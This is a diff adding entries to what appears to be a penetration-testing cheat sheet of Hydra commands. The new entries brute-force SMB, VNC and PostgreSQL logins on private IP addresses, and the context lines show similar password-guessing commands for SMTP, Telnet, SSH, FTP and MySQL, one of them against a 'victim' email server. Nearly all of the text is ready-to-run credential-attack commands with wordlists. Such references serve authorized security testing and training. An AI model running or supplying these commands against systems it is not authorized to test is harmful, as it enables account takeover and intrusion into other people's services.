@@ -117,6 +117,13 @@ hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Deskto
 # Telnet Login
 hydra -l <username> -P <password_file> telnet://targetname
 
+# SMB Login
+hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f
+
+# VNC Login
+;; VNC does not use a username
+hydra -P passwords.txt 192.168.2.62 vnc -V
+
 # SSH Login 1
 hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh -t 4
 hydra -L users.txt -P 10_million_password_list_top_1000.txt -t 4 192.168.1.69 ssh -vv
@@ -157,6 +164,9 @@ hydra -l user -P passlist.txt ftp://192.168.0.1
 hydra -L <your_username_file> -P <your_password_file> <IP> mysql -s 3306 -o output.txt
 or 
 hydra -L <your_username_file> -P <your_password_file> <IP> mysql -o output.txt
+
+# Bruteforce postgresql
+hydra -L usernames.txt -P passwords.txt 192.168.2.62 postgres -V
 
 # Sending Hydra traffic through Proxy
 ## It is often useful to analyze what we are actually doing with hydra, to this
